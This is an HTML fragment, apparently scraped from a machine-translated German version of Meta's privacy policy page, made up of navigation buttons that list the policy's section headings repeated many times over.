                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
